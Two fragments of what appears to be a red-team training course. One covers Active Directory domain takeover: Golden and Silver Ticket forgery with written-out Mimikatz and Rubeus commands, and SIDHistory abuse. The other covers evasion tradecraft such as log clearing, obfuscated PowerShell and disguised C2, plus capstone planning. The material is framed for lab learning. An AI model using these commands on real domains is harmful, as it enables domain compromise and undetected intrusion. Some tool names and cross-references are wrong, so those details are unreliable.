      "content": "Alright team, buckle up! We've journeyed from a single compromised host, learned to find our way around, grab local goodies, elevate our access, hop between machines, and map out the entire Active Directory forest. Now, we're standing at the precipice of ultimate power within the domain.\r\n\r\nThis is Module 7: **Domain Dominance & Persistence**. This is where we transition from being just *on* the network to effectively *owning* it. We'll learn the techniques that allow attackers to seize control of the domain itself and, crucially, how to ensure that control persists even if our initial footholds are discovered and removed.\r\n\r\nThis module is powerful. These techniques are the crown jewels of many advanced persistent threats (APTs) and red teams. With great power comes great responsibility – remember, we are doing this to *learn* and *defend*. All practical exercises *must* be conducted in your isolated lab environment.\r\n\r\n---\r\n\r\n## Module 7: Domain Dominance & Persistence\r\n\r\n**Module Objective:** Achieve Domain Administrator privileges (or equivalent control) and establish persistent access within the Active Directory environment using advanced techniques.\r\n\r\n**Learning Goals:** By the end of this module, you will be able to:\r\n\r\n*   Understand and leverage high-privilege credentials and tickets for domain control.\r\n*   Explain the theory and execute practical attacks like Golden and Silver Tickets.\r\n*   Identify and potentially exploit SIDHistory for cross-domain privilege escalation.\r\n*   Implement various methods for maintaining persistent access within an Active Directory domain.\r\n*   Discuss the operational security implications of domain-level actions.\r\n\r\n---\r\n\r\n### 7.1 Leveraging Attack Paths & Targeting High-Value Accounts\r\n\r\nWe spent Module 5 meticulously mapping the Active Directory landscape with tools like PowerView and, most importantly, BloodHound. Module 6 equipped us with advanced credential attacks like Kerberoasting and AS-REP Roasting. Now, it's time to synthesize that information and execute.\r\n\r\n**Theory:**\r\n\r\nBloodHound isn't just pretty graphs; it's a sophisticated pathfinding engine. It takes the relationships (sessions, group memberships, ACLs, delegation rights, etc.) you enumerated and finds the *shortest paths* from your initial access point (or any user/computer you control) to your desired target (usually Domain Admins, but could be sensitive data, specific servers, etc.).\r\n\r\nIdentifying high-value accounts means finding users or groups that possess privileges allowing control over significant parts of the domain. The ultimate prize is typically the `Domain Admins` group, but others like `Enterprise Admins`, `Builtin Administrators` (on DCs), `Backup Operators`, or even users with specific powerful rights (like `SeEnableDelegationPrivilege` or `GenericAll` on critical objects) can be targets.\r\n\r\n**Practical Application:**\r\n\r\n1.  **Review BloodHound Output:** Go back to your Neo4j database from Module 5.\r\n    *   Run queries like:\r\n        *   `Find shortest paths to Domain Admins`\r\n        *   `Find principals with unconstrained delegation`\r\n        *   `Find high value targets`\r\n        *   `Find Kerberoastable accounts` (if you haven't exploited them yet)\r\n        *   `Find computers where Domain Admins have sessions`\r\n    *   Analyze the paths. Each edge in the graph represents a potential step (e.g., \"User X has session on Computer Y\", \"User A is member of Group B\", \"Computer Z has Admin rights on Computer W\").\r\n    *   Identify the *type* of relationship you need to exploit to move along the path. Is it a session you can hijack? A credential you can reuse (PtH/PtT)? A service ticket you can request and crack (Kerberoasting)? A misconfigured ACL you can leverage?\r\n2.  **Prioritize Targets:** Focus on paths that seem most feasible based on the credentials/access you've already obtained or believe you can obtain easily. A path involving Kerberoasting a few accounts might be quicker than finding a complex PE on a specific machine.\r\n3.  **Execute Based on Path:** This is where you apply techniques from Modules 3, 4, and 6.\r\n    *   If the path goes through a computer where a high-priv user has a session, use lateral movement techniques (M4) like PsExec, WMI, or PowerShell Remoting, potentially combined with harvested credentials (M6) or token impersonation (M3), to get onto that machine. Once there, maybe you can dump LSASS (M2) to get the user's current credentials or tickets.\r\n    *   If the path involves a Kerberoastable user who is a member of a privileged group, execute the Kerberoasting attack (M6), crack the hash, and use the resulting cleartext password or NTLM hash for lateral movement or authentication.\r\n    *   If the path involves a computer object with Unconstrained Delegation, compromising that computer allows you to potentially trick users into authenticating to it, capturing their TGTs.\r\n    *   If the path involves weak ACLs on an Organizational Unit (OU) or group, you might be able to add your own user to a privileged group directly.\r\n\r\n**Example Walkthrough Idea (Conceptual):**\r\n\r\n*   BloodHound shows: `CompromisedUser` -> `MemberOf` -> `WorkstationAdmins` -> `AdminTo` -> `SensitiveServer` -> `HasSession` -> `DomainAdminUser`.\r\n*   *Plan:*\r\n    1.  Use `CompromisedUser`'s access.\r\n    2.  Leverage `WorkstationAdmins` membership (maybe they have admin rights on their own workstation).\r\n    3.  Find credentials on the workstation to get admin on `SensitiveServer` (lateral movement M4, M6).\r\n    4.  Once on `SensitiveServer`, look for sessions or credentials of `DomainAdminUser` (recon M2).\r\n    5.  Dump LSASS or find cached credentials for `DomainAdminUser`.\r\n    6.  Use `DomainAdminUser` credentials/hash/ticket to achieve Domain Admin access.\r\n\r\nThis section is less about *new* techniques and more about *applying* the techniques you've learned in a strategic, data-driven way guided by AD enumeration.\r\n\r\n---\r\n\r\n### 7.2 Golden Ticket Attacks\r\n\r\nThis is one of the most powerful attacks against Active Directory. It allows you to forge a Ticket Granting Ticket (TGT) for *any* user in the domain, effectively granting you the ability to impersonate that user and access *any* resource within the domain (and potentially trusted domains).\r\n\r\n**Theory:**\r\n\r\nKerberos authentication relies on a trusted third party: the Key Distribution Center (KDC), which is the Domain Controller. The KDC has a special account, `krbtgt`, whose NTLM hash is used to encrypt and sign TGTs. A TGT is like a long-term pass that proves your identity to the KDC. Once you have a TGT, you can request Service Tickets (TGSs) for specific services (like accessing a file share, running a remote command) without needing your password again.\r\n\r\nA Golden Ticket attack works by obtaining the `krbtgt` account's NTLM hash. With this hash, an attacker can manually *forge* a valid TGT for *any* user (even non-existent ones) with *any* group memberships (including Domain Admins, Enterprise Admins, etc.). This forged ticket is signed with the legitimate `krbtgt` hash, so the KDC and other services trust it implicitly.\r\n\r\n**Prerequisites:**\r\n\r\n*   The NTLM hash of the `krbtgt` account.\r\n*   The Domain Name.\r\n*   The Domain SID.\r\n*   Administrator or SYSTEM privileges on *any* domain-joined machine to inject the ticket into a session (or use tools like Impacket from an attacker machine).\r\n\r\n**How to get the `krbtgt` hash:**\r\n\r\nThe most common way is using the `DCSync` technique (covered in 7.3) from a machine with sufficient privileges (Domain Admins, Enterprise Admins, or specific ACLs). Alternatively, if you have administrative access on a Domain Controller, you can dump the NTDS.DIT database and extract the hash offline (e.g., using `secretsdump.py` or `dsntutil.exe` + `pypykatz`).\r\n\r\n**Practical Application (using Mimikatz):**\r\n\r\nAssume you have already obtained the `krbtgt` hash (e.g., `a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4`).\r\n\r\n1.  **Get Domain SID:** You can get this from any domain-joined machine.\r\n    ```powershell\r\n    whoami /user\r\n    ```\r\n    Look for the SID string (e.g., `S-1-5-21-...). The portion before the last hyphen is the Domain SID.\r\n    Alternatively:\r\n    ```powershell\r\n    (Get-ADDomain).DomainSID\r\n    ```\r\n    (Requires ActiveDirectory PowerShell module, which might not be on a standard compromised host, but is common on admin workstations or DCs).\r\n    Let's say the Domain SID is `S-1-5-21-1234567890-987654321-123456789`. The relevant part for Mimikatz is `1234567890-987654321-123456789`.\r\n\r\n2.  **Inject the Golden Ticket:** Open Mimikatz (requires Administrator/SYSTEM).\r\n    ```mimikatz\r\n    # Ensure you have the necessary privileges\r\n    privilege::debug\r\n\r\n    # Inject the golden ticket\r\n    # Parameters:\r\n    # /user: The username to impersonate (can be fake, e.g., \"administrator\" or \"pwnedadmin\")\r\n    # /domain: The FQDN of the domain (e.g., \"corp.local\")\r\n    # /sid: The Domain SID obtained in step 1\r\n    # /krbtgt: The NTLM hash of the krbtgt account\r\n    # /ptt: Pass The Ticket - injects the ticket into the current session\r\n    kerberos::golden /user:pwnedadmin /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt\r\n    ```\r\n\r\n3.  **Verify the Ticket:** Use `klist` to view the Kerberos tickets in your current session. You should see a TGT for the user you specified, issued by `krbtgt`.\r\n\r\n    ```cmd\r\n    klist\r\n    ```\r\n\r\n4.  **Access Resources:** Now, you can access any resource in the domain as `pwnedadmin` (which effectively has the privileges you assigned via the group memberships implied by the ticket).\r\n\r\n    ```cmd\r\n    # Access a file share on a Domain Controller\r\n    net use \\\\DC01.corp.local\\SYSVOL\r\n\r\n    # Or run a command remotely on a DC using PsExec (assuming it's allowed)\r\n    # This might require specific PsExec versions or configurations to use the injected ticket\r\n    # A more reliable way might be to use Impacket's psexec.py with the ticket cache\r\n    ```\r\n\r\n**Practical Application (using Rubeus):**\r\n\r\nRubeus is a C# alternative to Mimikatz for Kerberos interaction, often preferred for its flexibility and less signatured nature compared to Mimikatz binaries.\r\n\r\n1.  **Get Domain SID:** Same as step 1 for Mimikatz.\r\n2.  **Inject the Golden Ticket:**\r\n    ```powershell\r\n    # Assuming you have Rubeus.exe accessible\r\n    .\\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /user:pwnedadmin /ptt\r\n    ```\r\n    Rubeus offers more options, like specifying group SIDs to add to the ticket explicitly, which gives finer-grained control over the resulting privileges if you don't want full DA.\r\n\r\n3.  **Verify & Access:** Same as steps 3 & 4 for Mimikatz.\r\n\r\n**OpSec Considerations:**\r\n\r\n*   Injecting tickets modifies the current logon session's ticket cache, which *can* be detected by sophisticated endpoint monitoring.\r\n*   Accessing resources with a forged ticket generates logs on the target resource server and potentially the DC, but they will look like legitimate Kerberos authentications *from the user specified in the ticket*. The anomaly is the *source* machine from which the authentication originated if that machine isn't typically used by the impersonated user.\r\n*   Obtaining the `krbtgt` hash (often via DCSync) is a very high-privilege action that is heavily logged and monitored by defenders.\r\n\r\n---\r\n\r\n### 7.3 Silver Ticket Attacks\r\n\r\nWhile a Golden Ticket grants access to *any* resource as *any* user, a Silver Ticket grants access to a *specific service* on a *specific server* as *any* user.\r\n\r\n**Theory:**\r\n\r\nKerberos authentication for services uses Service Tickets (TGSs). A TGS is encrypted and signed with the NTLM hash of the *service account* or the *computer account* hosting the service. Forging a Silver Ticket involves obtaining the NTLM hash of the target server's computer account (or the hash of the specific service account if one is used and has an SPN) and using it to manually forge a valid TGS for a specific service on that server.\r\n\r\nSince the ticket is signed with the legitimate key (the server's hash), the target server trusts the ticket and grants access to the specified service, regardless of the actual user requesting it.\r\n\r\n**Prerequisites:**\r\n\r\n*   The NTLM hash of the target server's computer account (e.g., `SERVER01$`).\r\n*   The Domain Name.\r\n*   The Domain SID.\r\n*   The Target Server's FQDN.\r\n*   The Service Name (SPN portion, e.g., `cifs`, `host`, `http`).\r\n*   Administrator or SYSTEM privileges on *any* domain-joined machine to inject the ticket.\r\n\r\n**How to get the target server's hash:**\r\n\r\nYou need administrator privileges on the target server itself to dump its LSASS or registry hives (SAM/SECURITY) and extract the `SERVER01$` account's NTLM hash. Techniques from Module 2 and 3 (Local Enumeration, Credential Harvesting, Privilege Escalation) are relevant here.\r\n\r\n**Practical Application (using Mimikatz):**\r\n\r\nAssume you have obtained the target server's hash (e.g., `b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5`). Let's target the CIFS service (for file shares) on `FILESERVER01.corp.local`.\r\n\r\n1.  **Get Domain SID & Domain Name:** Same as for Golden Ticket.\r\n2.  **Get Target Server Hash:** Assumed obtained (e.g., via local admin + Mimikatz `lsadump::sam`).\r\n3.  **Identify Service Name:** Common services include `cifs` (file shares), `host` (many things, including RDP), `http` (web services), `mssql` (SQL Server).\r\n4.  **Inject the Silver Ticket:** Open Mimikatz (requires Administrator/SYSTEM).\r\n    ```mimikatz\r\n    privilege::debug\r\n\r\n    # Inject the silver ticket\r\n    # Parameters:\r\n    # /user: The username to appear as in logs (can be fake, e.g., \"fakeuser\")\r\n    # /domain: The FQDN of the domain\r\n    # /sid: The Domain SID\r\n    # /target: The FQDN of the target server\r\n    # /service: The service name (e.g., cifs)\r\n    # /ntlm: The NTLM hash of the target server's computer account (SERVER01$)\r\n    # /ptt: Pass The Ticket\r\n    kerberos::silver /user:fakeuser /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /ptt\r\n    ```\r\n\r\n5.  **Verify the Ticket:** Use `klist`. You should see a TGS for `cifs/FILESERVER01.corp.local`.\r\n\r\n    ```cmd\r\n    klist\r\n    ```\r\n\r\n6.  **Access the Service:** Now, you can access the specified service on the target server.\r\n\r\n    ```cmd\r\n    # Access a file share on FILESERVER01\r\n    net use \\\\FILESERVER01.corp.local\\sharename\r\n    ```\r\n\r\n**Practical Application (using Rubeus):**\r\n\r\n```powershell\r\n# Assuming you have Rubeus.exe accessible\r\n.\\Rubeus.exe silver /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /user:fakeuser /ptt\r\n```\r\n\r\n**OpSec Considerations:**\r\n\r\n*   Similar to Golden Tickets, injecting the ticket modifies the session and generates logs on the target server.\r\n*   The authentication log on the target server will show access for the user specified in `/user`, but the source machine might be unusual for that user.\r\n*   Obtaining the target server's hash requires administrative access on that specific server, which itself has OpSec implications (Module 2/3/4).\r\n\r\n---\r\n\r\n### 7.4 SIDHistory Exploitation\r\n\r\nSIDHistory is a lesser-known vector but can be powerful in environments with a history of domain migrations or acquisitions.\r\n\r\n**Theory:**\r\n\r\nWhen user or group accounts are migrated from one domain to another, their original SID from the source domain can be added to the `sIDHistory` attribute of the new account in the target domain. This allows the migrated account to retain access to resources in the source domain that were ACL'd using the original SID.\r\n\r\nThe security principal (user or group) possessing a SID in its `sIDHistory` attribute *can* be treated by the target resource as if it were the original security principal from the source domain for access control purposes.\r\n\r\nThe exploit comes when a user account in Domain A has the SID of a highly privileged group (like Domain Admins) from Domain B in its `sIDHistory`, and there is a trust relationship that allows Domain A users to access resources in Domain B. The user in Domain A might then be able to access resources in Domain B as if they were a Domain Admin *from Domain B*.\r\n\r\n**Prerequisites:**\r\n\r\n*   A trust relationship between domains.\r\n*   An account in one domain with the SID of a privileged group from *another* trusted domain in its `sIDHistory`.\r\n*   The ability to authenticate as that account.\r\n\r\n**Practical Application:**\r\n\r\nExploiting SIDHistory often involves *creating* a user with a manipulated `sIDHistory` or *modifying* an existing user's `sIDHistory`. This typically requires high privileges (like Domain Admin) in the *source* domain or the ability to perform DCShadow/modify AD objects with sufficient rights.\r\n\r\nSince *creating* this condition requires high privileges anyway, the exploit itself is usually just authenticating as the manipulated user and accessing resources in the trusted domain. The key is *identifying* existing accounts with potentially exploitable SIDHistory.\r\n\r\n1.  **Identify Accounts with SIDHistory:** Use AD enumeration tools.\r\n    ```powershell\r\n    # Using PowerView (from PowerSploit)\r\n    Get-DomainUser -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\r\n\r\n    Get-DomainGroup -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\r\n    ```\r\n2.  **Analyze SIDHistory:** Look at the SIDs listed. Try to identify the domain and the original account/group the SID belongs to. Use resources like `addam.py` from Impacket or online SID lookups to identify common well-known SIDs (like Domain Admins). If you see a SID corresponding to a privileged group from a trusted domain, you've found a potential vector.\r\n3.  **Leverage the Account:** If you have the credentials for an account with an interesting SIDHistory, simply authenticate as that user (e.g., via `runas /netonly`, PsExec, or Pass-the-Hash if you have the hash) and attempt to access resources in the domain corresponding to the SID in the history.\r\n\r\n**Creating SIDHistory (Requires High Privileges):**"

      "content": "Alright team! We've traversed the intricate pathways of Windows internals, harvested precious credentials, scaled local privileges, danced across the network, and mapped the hidden relationships within Active Directory. Now, we arrive at the culmination – Module 8.\r\n\r\nThis isn't just a wrap-up; it's where we synthesize everything. We stop thinking about individual techniques and start thinking like a cohesive red team operator. We'll focus on the crucial, often overlooked, aspects: *Operational Security (OpSec)* to stay undetected, the *Planning* that makes an operation efficient, the *Execution* where theory meets reality, and the *Reporting* that translates our technical feats into actionable intelligence for defenders.\r\n\r\nThis module is designed around the **Capstone Project**. Your journey through Modules 1-7 has equipped you with the tools and knowledge. Now, you'll apply them end-to-end in a simulated operation. Think of this as your final exam, but one where you get to write the questions (your plan) and show your work (your execution and report).\r\n\r\nLet's dive into the final, critical pieces of the puzzle!\r\n\r\n---\r\n\r\n## Module 8: Operational Security (OpSec), Reporting & Capstone Project\r\n\r\n**Module Objective:** Understand and apply OpSec principles throughout the operation, synthesize all learned techniques, plan a simulated red team engagement, execute it in the lab, and document the process and findings.\r\n\r\n**Duration:** This module is primarily driven by the Capstone Project, which will require significant hands-on lab time. Allocate time for planning (several hours), execution (potentially several hours spread out), and reporting (several hours).\r\n\r\n---\r\n\r\n### Section 8.1: Operational Security (OpSec) - The Art of Not Getting Caught\r\n\r\nWelcome to the shadowy world of OpSec. While gaining access and escalating privileges is exciting, doing it stealthily is what separates a noisy script kiddie from a professional red teamer. OpSec is about minimizing your footprint, blending in, and understanding how defenders see the world.\r\n\r\n**Why OpSec Matters:**\r\n\r\n*   **Real Engagements:** Getting caught early means mission failure. It burns your tools, techniques, and procedures (TTPs).\r\n*   **Lab Environment:** Even in a lab, practicing good OpSec helps you understand *why* certain techniques are better than others and prepares you for real-world constraints. It forces you to think like a defender trying to catch you.\r\n\r\n#### 8.1.1 Reviewing OpSec by Phase\r\n\r\nLet's revisit the stages we've covered and highlight OpSec considerations at each step:\r\n\r\n*   **Initial Access (Assumed):** While we started *after* initial access, the methods *used* for initial access (phishing, exploit, weak RDP, etc.) have huge OpSec implications. A loud exploit might trigger immediate alerts, while a carefully crafted phishing email with a subtle payload might go unnoticed longer.\r\n*   **Module 1: Initial Host Reconnaissance:**\r\n    *   **Risk:** Running noisy commands (`systeminfo`, `tasklist`, `netstat`) frequently or in rapid succession can look suspicious, especially if logged. Using standard binaries is generally better than dropping custom tools early.\r\n    *   **OpSec Tip:** Use native commands where possible. Space out your commands. Understand what commands are *expected* on that system (e.g., a sysadmin might run `tasklist`, but maybe not every 5 minutes).\r\n*   **Module 2: Local Enumeration & Credential Harvesting:**\r\n    *   **Risk:** Accessing sensitive files/registry keys, dumping LSASS. Duming LSASS is *highly* suspicious and often a prime detection vector for EDR/AV. Running unknown executables (`procdump`, `Mimikatz` variants) is also risky.\r\n    *   **OpSec Tip:** Use fileless techniques (PowerShell scripts loaded directly into memory). Use trusted/signed binaries if available (though attackers use these too!). Understand *how* tools like Mimikatz work (`sekurlsa::logonpasswords`) and what system calls they make, as defenders look for those specific calls. Consider *offline* analysis if you can exfiltrate memory dumps or registry hives without touching LSASS directly on the target.\r\n*   **Module 3: Windows Privilege Escalation:**\r\n    *   **Risk:** Creating new services, dropping exploit binaries, modifying registry keys, using known vulnerable kernel exploits. UAC bypasses might trigger specific EDR rules.\r\n    *   **OpSec Tip:** Leverage misconfigurations that *don't* require dropping files (e.g., weak service permissions you can modify in place). Use reflective DLL injection or in-memory PE techniques. Understand the detection surface of common PE tools (`PowerUp`, `WinPEAS`) and consider manually replicating steps or using less common variants.\r\n*   **Module 4: Lateral Movement:**\r\n    *   **Risk:** Using noisy tools like PsExec (sysinternals version is often flagged), high volume of failed authentication attempts, using unexpected protocols (WMI, PowerShell Remoting) between unusual hosts, creating scheduled tasks remotely.\r\n    *   **OpSec Tip:** Blend in. Use protocols *expected* between systems (e.g., RDP for admin access, SMB for file shares). Use credentials you've harvested via PtH/PtT rather than brute-forcing. Use in-memory execution frameworks (like Covenant, Empire, Metasploit) that handle lateral movement tasks more stealthily than dropping raw executables. Use `Invoke-Command` or `Enter-PSSession` with appropriate credentials if PowerShell Remoting is common in the environment.\r\n*   **Module 5: Active Directory Enumeration:**\r\n    *   **Risk:** High volume of LDAP/S queries from a single host, especially from an unusual user or machine. Running BloodHound collectors (`SharpHound`, `PowerHound`) can be noisy due to the sheer volume of queries they make.\r\n    *   **OpSec Tip:** Use native tools (`net group /domain`, `nltest`) sparingly first. Use less noisy AD enumeration techniques if possible. Run BloodHound collectors from a system that is less monitored or blend the collection activity over a longer period. Understand *what* queries BloodHound makes so you know what defenders might see.\r\n*   **Module 6: Advanced Credential Attacks:**\r\n    *   **Risk:** Kerberoasting (requesting many SPN tickets from a DC can be detected, especially if done from a non-server OS), AS-REP Roasting (failed pre-authentication attempts logged on the DC), PtH/PtT (using tickets/hashes from unusual source IPs). Using tools like Mimikatz/Rubeus on target systems.\r\n    *   **OpSec Tip:** Perform Kerberoasting from a less critical host. Be mindful of the number of requests. Perform offline cracking *off* the target network. Use PtH/PtT carefully, ensuring the source/destination combination doesn't look anomalous. Use in-memory versions of tools like Rubeus via PowerShell.\r\n*   **Module 7: Domain Dominance & Persistence:**\r\n    *   **Risk:** Modifying sensitive AD objects (users, groups, GPOs, AdminSDHolder), using highly suspicious techniques like DCSync or DCShadow (these look like domain controllers replicating!). Creating persistent backdoors (scheduled tasks, services, WMI permanent events, modifying logon scripts, etc.).\r\n    *   **OpSec Tip:** Understand what is being monitored on Domain Controllers (Event IDs related to object modification, replication, logon/logoff). Use techniques that blend in (e.g., modifying an *existing* GPO subtly rather than creating a new one). Use less common persistence methods. Be *extremely* cautious with DCSync/DCShadow – these are often considered high-risk techniques likely to trigger alerts.\r\n\r\n#### 8.1.2 Common Detection Mechanisms\r\n\r\nDefenders use various tools and techniques to spot malicious activity. Understanding these helps you evade them.\r\n\r\n1.  **Endpoint Detection and Response (EDR) / Antivirus (AV):**\r\n    *   **What they see:** Malicious file hashes, suspicious process behavior (e.g., a standard user process accessing LSASS memory), unusual parent-child process relationships (e.g., `cmd.exe` spawning `powershell.exe` with encoded commands), modifications to critical system areas (registry, startup folders), known exploit patterns.\r\n    *   **Evasion thought:** Use fileless execution, process injection, obfuscate scripts, use Living Off The Land Binaries/Scripts (LOLBAS - using legitimate system tools for malicious purposes, like `certutil` for decoding files, `powershell` for execution, `bitsadmin` for downloads).\r\n2.  **Network Monitoring (IDS/IPS, Network Traffic Analysis):**\r\n    *   **What they see:** Connections to known bad IPs, high volume of traffic on unusual ports (e.g., SMB traffic from a workstation to another workstation that isn't normally a file server), scanning activity, suspicious protocol usage (e.g., NTLM authentication attempts with old hashes, Kerberos service ticket requests for many SPNs).\r\n    *   **Evasion thought:** Use encrypted channels (HTTPS C2), tunnel traffic, blend in with normal traffic patterns, minimize scanning, use credentials/hashes via PtH/PtT instead of brute force.\r\n3.  **Logging and Security Information and Event Management (SIEM):**\r\n    *   **What they see:** This is the defender's primary source of truth. Windows Event Logs (Security, System, Application), Sysmon logs (highly detailed process, network, file activity), Domain Controller logs (authentication events, object modifications, replication). SIEMs correlate these logs to spot patterns (e.g., failed login attempts followed by a successful login from a different user/IP, a user account logging into multiple machines in a short time, unusual service installations).\r\n    *   **Evasion thought:** Understand critical Event IDs (e.g., 4624/4625 Logon/Logoff, 4688 Process Creation, 4720 User Created, 4732 Group Membership Added). Avoid generating excessive failed events. Be cautious with log clearing (`wevtutil cl system` etc.) as clearing logs *itself* generates a log event (Event ID 1102)! Focus on techniques that generate *fewer* or *less suspicious* log entries. Sysmon is a pain for attackers; understanding its configuration is key.\r\n\r\n#### 8.1.3 Evasion Techniques & Tradecraft\r\n\r\nBeyond specific tool usage, OpSec is a mindset and a set of practices:\r\n\r\n*   **Living Off The Land (LOTL):** Use legitimate system tools (PowerShell, WMI, schtasks, bitsadmin, etc.) as much as possible instead of dropping custom malware. This makes your activity look more like legitimate system administration.\r\n*   **Fileless Techniques:** Execute payloads directly in memory (e.g., PowerShell scripts via `IEX`, reflective DLL injection) to avoid writing malicious files to disk, which AV/EDR often monitor.\r\n*   **Obfuscation:** Encode or obfuscate scripts and commands to make them harder for static analysis (AV signatures) and defenders to read (`powershell -encodedcommand ...`).\r\n*   **Timing:** Perform actions during off-hours or maintenance windows when activity might be expected or monitoring staff are less vigilant (though automated alerting should still catch you!).\r\n*   **Tooling:** Use reputable red team frameworks (Covenant, Empire, Metasploit, PoshC2) that implement better OpSec practices (encrypted C2, in-memory execution, less signatured payloads) than raw tools. Understand the OpSec profile of your tools – Mimikatz is loud, but essential; use it judiciously.\r\n*   **User Simulation:** Try to make your activity look like a legitimate user or administrator on the network. Access expected resources, use expected protocols.\r\n*   **C2 Communications:** Use encrypted channels (HTTPS is common) and potentially domain fronting or compromised legitimate domains to masquerade command and control traffic.\r\n\r\n**OpSec is a constant cat-and-mouse game.** Defenders improve, and attackers adapt. Staying current on detection methods is crucial for effective red teaming.\r\n\r\n### Section 8.2: Planning a Red Team Operation (Capstone Phase 1)\r\n\r\nBefore you touch a single key in the lab for your Capstone, you *must* plan. A good plan saves time, reduces noise, and increases your chances of success.\r\n\r\n#### 8.2.1 Why Plan?\r\n\r\n*   **Clarity of Purpose:** What are you trying to achieve? (The objective).\r\n*   **Efficiency:** Avoid wasted steps or going down rabbit holes.\r\n*   **Risk Management:** Understand the potential detection points and have contingencies.\r\n*   **Team Coordination (Real World):** Ensures everyone is on the same page and not stepping on each other's toes.\r\n*   **Measurability:** How do you know you succeeded?\r\n\r\n#### 8.2.2 Key Planning Elements\r\n\r\n1.  **Define Objectives:** This is the *goal* of the operation. For your Capstone, choose something specific and achievable within your lab environment. Examples:\r\n    *   Obtain Domain Administrator privileges.\r\n    *   Access a specific sensitive file share (e.g., `\\\\DC01\\HR_Data`).\r\n    *   Establish persistent access on the Domain Controller.\r\n    *   Compromise a specific user's mailbox or cloud storage (if simulated).\r\n    *   Exfiltrate a specific \"sensitive\" file.\r\n    *   Establish persistence on at least 3 different machines in the network.\r\n\r\n    *Write down your objective clearly.*\r\n\r\n2.  **Define Scope:** What systems, subnets, user accounts, or applications are *in bounds* for this operation? In your lab, this might be \"all machines in the `CONTOSO.COM` domain\" or \"only systems on the 192.168.1.0/24 subnet\". *Write down your scope.*\r\n\r\n3.  **Define Rules of Engagement (RoE):** In a real engagement, this is critical and covers things like: Are DoS attacks allowed? Can we target specific individuals? What hours can we operate? What is the \"get out of jail free\" card if we're caught? In your lab, this is simpler, but still good practice:\r\n    *   Are you allowed to modify system configurations permanently (except for persistence objectives)?\r\n    *   Are you allowed to shut down systems? (Probably not).\r\n    *   What is the starting point (the \"initial access\" context)? (e.g., \"You have a low-priv shell on WKSTN1\").\r\n\r\n    *Define simple RoE for your lab.*\r\n\r\n#### 8.2.3 Intelligence Gathering & Attack Path Mapping\r\n\r\nThis is where you leverage the skills from Modules 1-5, especially Module 5 (AD Enumeration and BloodHound).\r\n\r\n*   **Review your AD Data:** Look at the BloodHound graph, your PowerView output, your `net` command results.\r\n*   **Identify High-Value Targets:** Who are the Domain Admins? Where do they log in? What systems are critical?\r\n*   **Map Potential Paths:** Use BloodHound queries or manually trace connections/privileges:\r\n    *   Shortest path from your starting point (initial access host/user) to your objective.\r\n    *   Identify users or groups with excessive privileges.\r\n    *   Find systems with potential misconfigurations (e.g., unconstrained delegation).\r\n    *   Locate users vulnerable to credential attacks (Kerberoastable, AS-REP Roasting).\r\n*   **Identify Choke Points:** Are there systems or users that, if compromised, open up many paths?\r\n\r\n#### 8.2.4 Strategy Development\r\n\r\nBased on your objective, scope, RoE, and intelligence, outline your plan. This isn't just a list of tools; it's a sequence of actions.\r\n\r\n1.  **Starting Point:** Where are you beginning? (e.g., Low-priv user `user.low` on `WKSTN1`).\r\n2.  **Phase 1: Initial Foothold & Local Recon:** What commands/scripts will you run immediately to understand the local host? (`whoami`, `ipconfig`, `tasklist`, basic file checks). OpSec consideration: Use native tools first.\r\n3.  **Phase 2: Local Enumeration & PE:** How will you look for local PE vectors? (`PowerUp`, `WinPEAS`, manual checks). What's your primary PE target? What's your backup? OpSec consideration: Use in-memory techniques if possible.\r\n4.  **Phase 3: Credential Harvesting:** How will you attempt to get credentials from the initial host *after* achieving local admin? (e.g., `Invoke-Mimikatz` via reflective PowerShell, dumping SAM/SECURITY hives). OpSec consideration: Dumping LSASS is high risk; prioritize other methods if feasible initially.\r\n5.  **Phase 4: AD & Network Recon:** How will you gather more AD info from your new privileged shell? (`PowerView`, `SharpHound`). OpSec consideration: Run collectors carefully, consider timing.\r\n6.  **Phase 5: Attack Path Execution & Lateral Movement:** Based on BloodHound/AD data, what's your *chosen* path to the objective? (e.g., User `svc_sql` is Kerberoastable -> Crack hash -> `svc_sql` is admin on `APP01` -> PsExec to `APP01` -> `APP01` has cached creds for `admin.da` -> PtH to DC). List the specific lateral movement techniques you plan to use for each hop. OpSec consideration: Which LM methods are less noisy?\r\n7.  **Phase 6: Reaching the Objective:** What are the final steps? (e.g., If objective is DA, it might be `PtH` to the DC's `krbtgt` hash to forge a Golden Ticket).\r\n8.  **Phase 7: Persistence (If objective includes it):** How will you maintain access? (e.g., Create a scheduled task, modify a GPO, DCSync a backup DA account). OpSec consideration: Choose a persistence method least likely to be found.\r\n9.  **Phase 8: Cleanup (Lab context):** Revert VMs.\r\n\r\n*Create a flowchart or detailed step-by-step list of your planned actions.* Include the *expected* tools/commands for each step. Have backup plans if a step fails.\r\n\r\n### Section 8.3: Execution (Capstone Phase 2)\r\n\r\nThis is where you put your plan into action in the lab environment.\r\n\r\n**Key Principles:**\r\n\r\n*   **Follow Your Plan:** Start by executing the steps you outlined.\r\n*   **Document *Everything*:** This is CRITICAL for your report. Don't just run commands; record them.\r\n*   **Be Flexible:** Your plan *will* encounter unexpected issues. Systems might be configured differently, tools might fail, techniques might not work. Be ready to troubleshoot and adapt your plan on the fly using your knowledge from M1-7.\r\n*   **Practice OpSec:** Be mindful of the noise you're making, even in the lab. If you planned a stealthy approach, stick to it.\r\n*   **Verify Each Step:** Did the PE succeed? Did the lateral movement work? Did you get the credentials?\r\n\r\n#### 8.3.1 Step-by-Step Execution & Documentation\r\n\r\nThis is the most important part of the execution phase for the Capstone. You need to capture *exactly* what you did.\r\n\r\n**Recommended Documentation Method:**\r\n\r\nMaintain a running log as you work. A simple text file, a Markdown file, or a tool like OneNote works well. For each action:\r\n\r\n1.  